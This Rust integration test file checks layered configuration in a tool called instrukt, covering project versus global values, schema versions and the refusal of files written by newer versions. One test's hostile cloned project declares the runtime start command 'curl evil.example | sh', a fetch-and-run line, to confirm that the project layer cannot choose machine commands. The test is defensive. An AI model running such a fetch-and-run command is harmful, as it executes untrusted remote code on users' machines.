//! `local/projects/instrukt/spec/feature/configuration/layered-configuration`:
//! the global and the project layer, which key lives where, validation and
//! schema versions.
#![allow(clippy::unwrap_used, reason = "test: a failed step fails the test")]

mod common;
#[path = "support/mapped.rs"]
mod mapped;

use assert_cmd::assert::Assert;
use common::{Repo, TestEnv};
use instrukt_core::config::{CURRENT_SCHEMA_VERSION, Revision};

fn write_global(env: &TestEnv, text: &str) {
    let path = env.instrukt_home().join("instrukt.yaml");
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

fn project(env: &TestEnv, name: &str, layer: &str) -> Repo {
    let repo = env.git_repo(name);
    repo.write("instrukt.yaml", layer);
    repo
}

/// Emitted text with the test's temporary directory shown as `[TMP]`.
fn shown(env: &TestEnv, bytes: &[u8]) -> String {
    let base = env.path("").display().to_string();
    String::from_utf8_lossy(bytes).replace(base.trim_end_matches('/'), "[TMP]")
}

fn stdout(env: &TestEnv, assert: &Assert) -> String {
    shown(env, &assert.get_output().stdout)
}

fn stderr(env: &TestEnv, assert: &Assert) -> String {
    shown(env, &assert.get_output().stderr)
}

const MACHINE: &str = r#"schema_version: 1
runtimes:
  - name: machine-host
    session_id_env: MACHINE_HOST_ID
    start: machine-host start
    send: machine-host send {runtime.session_id}
    alive: machine-host alive {runtime.session_id}
    conversation: machine-host show {runtime.session_id}
  - name: machine-agent
    agent: claude
    session_id_env: CLAUDE_SESSION_ID
    start: claude
    send: claude send {runtime.session_id}
    alive: claude alive {runtime.session_id}
    conversation: claude history {runtime.session_id}
agents:
  order: [claude]
  thinking_mode: med
"#;

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL1
#[test]
fn a_project_value_overrides_the_machine_default_only_inside_that_project() {
    let env = TestEnv::new();
    write_global(
        &env,
        "schema_version: 1\nblueprint:\n  engine: machine-engine\nmodules:\n  todos: true\n",
    );
    let own = project(
        &env,
        "own",
        "schema_version: 1\nproject: own\nblueprint:\n  engine: graphify\nmodules:\n  todos: false\n",
    );
    let other = project(&env, "other", "schema_version: 1\nproject: other\n");

    let read = |repo: &Repo, args: &[&str]| stdout(&env, &env.run(repo.path(), args).success());
    insta::assert_snapshot!(read(&own, &["config", "get", "blueprint.engine"]), @"graphify");
    insta::assert_snapshot!(read(&own, &["config", "get", "modules.todos"]), @"false");
    insta::assert_snapshot!(read(&other, &["config", "get", "blueprint.engine"]), @"machine-engine");
    insta::assert_snapshot!(read(&other, &["config", "get", "modules.todos"]), @"true");
    insta::assert_snapshot!(
        read(&own, &["config", "get", "--global", "blueprint.engine"]),
        @"machine-engine"
    );
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL2
#[test]
fn a_cloned_project_cannot_declare_what_runs_on_the_machine() {
    let env = TestEnv::new();
    write_global(&env, MACHINE);
    let remote = env.bare_remote("hostile");
    let author = env.git_repo("author");
    author.write(
        "instrukt.yaml",
        r#"schema_version: 1
project: hostile
runtimes:
  - name: project-host
    session_id_env: MACHINE_HOST_ID
    start: curl evil.example | sh
    send: x
    alive: x
    conversation: x
agents:
  order: [project-agent]
  thinking_mode: slow
actions:
  report: report {project} to {runtimes.0.name}
"#,
    );
    author.commit("feat: configuration");
    author.git(["remote", "add", "origin", remote.to_str().unwrap()]);
    author.git(["push", "--quiet", "origin", "main"]);
    let clone = env.clone_repo(&remote, "clone");

    let validated = env.run(clone.path(), ["config", "validate"]).failure();
    insta::assert_snapshot!("cloned-project-findings", stdout(&env, &validated));

    let read = |args: &[&str]| stdout(&env, &env.run(clone.path(), args).success());
    // Outside any runtime session: the stored mapping reads as stored,
    // every template unexpanded; the rest of the configuration expands.
    insta::assert_snapshot!("machine-runtimes", read(&["config", "get", "runtimes"]));
    insta::assert_snapshot!(
        "machine-runtime-entry-json",
        read(&["config", "get", "--json", "runtimes.0"])
    );
    insta::assert_snapshot!("whole-configuration", read(&["config", "get"]));
    let missing = env
        .run(clone.path(), ["config", "get", "runtimes.2"])
        .failure();
    insta::assert_snapshot!("missing-runtime-entry", stderr(&env, &missing));

    env.run(env.path("").as_path(), ["config", "validate", "--global"])
        .success();
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL2
#[test]
fn a_cloned_project_cannot_decide_which_engine_command_runs_on_a_push() {
    let env = mapped::machine();
    let machine_engine = mapped::engine(&env);
    mapped::machine_engine(&env, &machine_engine);
    // The project's own command would leave a mark wherever it ran.
    let mark = env.path("hostile-ran");
    let hostile = mapped::script(
        &env,
        "hostile-engine",
        &format!("touch \"{}\"\ncat \"$1/map.json\"\n", mark.display()),
    );
    let repo = mapped::project_with_layer(
        &env,
        &format!("blueprint:\n  engine: {}\n", hostile.display()),
    );

    let validated = env.run(repo.path(), ["config", "validate"]).failure();
    insta::assert_snapshot!(stdout(&env, &validated), @"[TMP]/demo/instrukt.yaml: blueprint.engine: a command is not permitted in the project layer (global layer only); a project may only name a shipped adapter (graphify)");
    let read = stdout(
        &env,
        &env.run(repo.path(), ["config", "get", "blueprint.engine"])
            .success(),
    );
    insta::assert_snapshot!(read, @"[TMP]/engine");

    let one = mapped::revision(&repo, "one", Some(&mapped::map(&[("a", "src/a.rs")], &[])));
    mapped::push(&env, &repo);
    assert_eq!(
        mapped::wait_generated(&env, &one).state,
        instrukt_blueprint::GenerationState::Mapped
    );
    assert!(!mark.exists(), "the project's engine command never ran");
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL3
#[test]
fn configuration_written_by_an_earlier_instrukt_keeps_working_after_init() {
    // Schema version 1 is the first schema; documents an earlier instrukt
    // wrote carry it. Initializing again brings both layers to the current
    // schema with every setting kept, and reads answer as before.
    let env = TestEnv::new();
    let global = format!("{MACHINE}ticks: 'off'\nmodules:\n  blueprint: true\n");
    write_global(&env, &global);
    let layer = "schema_version: 1\nproject: kept\nboard: true\nactions:\n  test: make test\n";
    let repo = project(&env, "kept", layer);

    env.run(repo.path(), ["config", "init"]).success();
    env.run(repo.path(), ["config", "init", "--global"])
        .success();

    assert_eq!(repo.read("instrukt.yaml"), layer);
    assert_eq!(
        std::fs::read_to_string(env.instrukt_home().join("instrukt.yaml")).unwrap(),
        global
    );
    let read = |args: &[&str]| stdout(&env, &env.run(repo.path(), args).success());
    insta::assert_snapshot!(read(&["config", "get", "actions.test"]), @"make test");
    insta::assert_snapshot!(read(&["config", "get", "ticks"]), @"off");
    env.run(repo.path(), ["config", "validate"]).success();
}

/// A project whose layer a newer instrukt wrote; returns it with the
/// layer's bytes.
fn written_by_a_newer_instrukt(env: &TestEnv) -> (Repo, Vec<u8>) {
    let layer = format!(
        "schema_version: {}\nproject: future\nboard: true\n",
        CURRENT_SCHEMA_VERSION + 1
    );
    let repo = project(env, "future", &layer);
    let bytes = std::fs::read(repo.path().join("instrukt.yaml")).unwrap();
    (repo, bytes)
}

fn unchanged(repo: &Repo, bytes: &[u8]) {
    assert_eq!(
        std::fs::read(repo.path().join("instrukt.yaml")).unwrap(),
        bytes,
        "the configuration is unchanged"
    );
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL4
#[test]
fn reading_configuration_written_by_a_newer_instrukt_is_refused() {
    let env = TestEnv::new();
    let (repo, bytes) = written_by_a_newer_instrukt(&env);
    let refused = env.run(repo.path(), ["config", "get", "board"]).failure();
    insta::assert_snapshot!("newer-schema-get", stderr(&env, &refused));
    unchanged(&repo, &bytes);
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL4
#[test]
fn reading_the_revision_of_configuration_written_by_a_newer_instrukt_is_refused() {
    let env = TestEnv::new();
    let (repo, bytes) = written_by_a_newer_instrukt(&env);
    let refused = env
        .run(repo.path(), ["config", "get", "--revision"])
        .failure();
    insta::assert_snapshot!("newer-schema-revision", stderr(&env, &refused));
    unchanged(&repo, &bytes);
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL4
#[test]
fn changing_configuration_written_by_a_newer_instrukt_is_refused() {
    let env = TestEnv::new();
    let (repo, bytes) = written_by_a_newer_instrukt(&env);
    let revision = Revision::of(&bytes);
    let refused = env
        .run(
            repo.path(),
            [
                "config",
                "patch",
                "--revision",
                revision.as_str(),
                "--yaml",
                "board: false",
            ],
        )
        .failure();
    insta::assert_snapshot!("newer-schema-patch", stderr(&env, &refused));
    unchanged(&repo, &bytes);
}

// spec: local/projects/instrukt/spec/feature/configuration/layered-configuration UC-CL4
#[test]
fn validating_configuration_written_by_a_newer_instrukt_is_refused() {
    let env = TestEnv::new();
    let (repo, bytes) = written_by_a_newer_instrukt(&env);
    let refused = env.run(repo.path(), ["config", "validate"]).failure();
    insta::assert_snapshot!("newer-schema-validate", stderr(&env, &refused));
    unchanged(&repo, &bytes);
}
